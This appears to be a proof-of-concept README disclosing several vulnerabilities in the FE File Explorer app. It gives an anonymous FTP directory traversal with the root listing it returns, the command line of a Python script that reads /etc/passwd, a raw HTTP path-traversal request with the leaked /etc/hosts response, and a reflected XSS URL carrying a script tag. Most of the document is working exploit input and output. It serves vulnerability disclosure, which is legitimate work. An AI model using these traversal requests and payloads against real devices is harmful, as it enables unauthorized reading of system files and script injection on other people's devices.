# FE-File-Explorer<br/>
FE File Explorer Multi Vulnerabilities<br/>
<br/>
### Directory traversal:<br/>
<br/>
connect to ftp as anynomous <br/>
<br/>
ftp> cd /../../../../../../../../../../../../../../../../ <br/>
250 OK. Current directory is /../../../../../../../../../../../../../../../../<br/>
ftp> ls<br/>
200 PORT command successful.<br/>
150 Accepted data connection<br/>
total 10<br/>
drwxr-xr-x     0 root wheel        256 Jan 01 1970 usr<br/>
drwxr-xr-x     0 root wheel        128 Jan 01 1970 bin<br/>
drwxr-xr-x     0 root wheel        576 Jan 01 1970 sbin<br/>
drwxr-xr-x     0 root wheel        160 Jan 01 1970 System<br/>
drwxr-xr-x     0 root wheel        672 Jan 01 1970 Library<br/>
drwxr-xr-x     0 root wheel        224 Jan 01 1970 private<br/>
drwxr-xr-x     0 root wheel       1132 Jan 01 1970 dev<br/>
drwxr-xr-x     0 root admin       3968 Jan 01 1970 Applications<br/>
drwxr-xr-x     0 root admin         64 Jan 01 1970 Developer<br/>
drwxr-xr-x     0 root admin         64 Jan 01 1970 cores<br/>
<br/>

## Local File Inclusion ( FTP ) : <br/>

python3 'FE File Explorer.py' --target 192.168.1.178 --file etc/passwd<br/>
<br/>
FE File Explorer Local File inclusion<br/>
<br/>
optional arguments:<br/>
  -h, --help       show this help message and exit<br/>
  --target TARGET  Target IP<br/>
  --file FILE      File To Open eg: etc/passwd<br/>


<br/><br/>


### Local File Inclusion (web) : <br/>
<br/>
GET /../../../../../../../../../../../../../../../../etc/hosts HTTP/1.1<br/>
Host: 192.168.1.178:8080<br/>
Upgrade-Insecure-Requests: 1<br/>
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25<br/>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br/>
Accept-Encoding: gzip, deflate<br/>
Accept-Language: en-US,en;q=0.9<br/>
Connection: close<br/>
<br/>
---<br/>
HTTP/1.1 200 OK<br/>
Connection: Close<br/>
Server: GCDWebUploader<br/>
Content-Type: application/octet-stream<br/>
Last-Modified: Wed, 13 Jul 2022 10:35:46 GMT<br/>
Date: Tue, 06 Sep 2022 21:40:40 GMT<br/>
Content-Length: 213<br/>
Cache-Control: max-age=3600, public<br/>
Etag: 1152921500312311378/1657708546/0<br/>
<br/>
##<br/>
 Host Database<br/>
#<br/>
.# localhost is used to configure the loopback interface<br/>
.# when the system is booting.  Do not change this entry.<br/>
##<br/>
127.0.0.1	localhost<br/>
255.255.255.255	broadcasthost<br/>
::1             localhost<br/>
<br/><br/><br/>
### Reflected xss: <br/>
<br/>
http://192.168.1.178:8080/download?path=%3Cscript%3Ealert(%27rose%20taken%27);%3C/script%3E<br/>
